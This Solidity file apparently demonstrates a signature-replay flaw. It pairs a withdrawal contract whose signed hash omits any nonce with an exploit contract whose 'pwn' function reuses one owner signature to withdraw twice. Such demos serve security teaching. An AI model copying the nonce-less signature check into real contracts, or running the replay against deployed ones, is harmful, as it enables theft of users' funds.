// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract SignatureReplay {
    address public immutable owner;
    bool private locked;

    constructor() payable {
        owner = msg.sender;
    }

    modifier lock() {
        require(!locked, "locked");
        locked = true;
        _;
        locked = false;
    }

    function withdraw(uint256 amount, bytes calldata sig) external lock {
        require(_verify(msg.sender, amount, sig), "invalid signature");
        payable(msg.sender).transfer(amount);
    }

    function getHash(address to, uint256 amount) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(to, amount));
    }

    function _getEthHash(bytes32 _hash) private pure returns (bytes32) {
        return
            keccak256(
                abi.encodePacked("\x19Ethereum Signed Message:\n32", _hash)
            );
    }

    function _verify(
        address to,
        uint256 amount,
        bytes calldata sig
    ) private view returns (bool) {
        bytes32 _hash = getHash(to, amount);
        bytes32 ethHash = _getEthHash(_hash);

        (bytes32 r, bytes32 s, uint8 v) = _split(sig);

        return ecrecover(ethHash, v, r, s) == owner;
    }

    function _split(bytes memory sig)
        private
        pure
        returns (
            bytes32 r,
            bytes32 s,
            uint8 v
        )
    {
        require(sig.length == 65, "invalid signature length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

interface ISignatureReplay {
    function withdraw(uint256 amount, bytes calldata sig) external;
}

contract SignatureReplayExploit {
    ISignatureReplay immutable target;

    constructor(address _target) {
        target = ISignatureReplay(_target);
    }

    receive() external payable {}

    function pwn(bytes calldata sig) external {
        target.withdraw(1 ether, sig);
        target.withdraw(1 ether, sig);
    }
}
